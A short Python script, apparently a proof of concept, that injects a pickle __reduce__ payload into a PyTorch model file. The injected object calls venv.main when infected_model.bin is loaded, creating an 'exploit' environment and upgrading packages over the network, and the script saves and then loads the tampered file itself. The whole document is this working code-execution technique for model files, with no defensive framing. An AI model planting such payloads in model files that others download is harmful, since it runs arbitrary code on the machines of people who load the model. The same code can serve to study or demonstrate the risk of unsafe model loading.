import venv

import torch


class VenvExploit:
    def __reduce__(self):
        return venv.main, (
           ['exploit', '--upgrade', '--upgrade-deps'],
        ), None, None, None

def make_infected_model():
    # Load the original model
    malicious_model = torch.load("pytorch_model.bin")

    # Add the malicious class to the end of the model
    malicious_model["create_venv"] = VenvExploit()


    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.bin")


if __name__ == "__main__":
    make_infected_model()
    torch.load("infected_model.bin")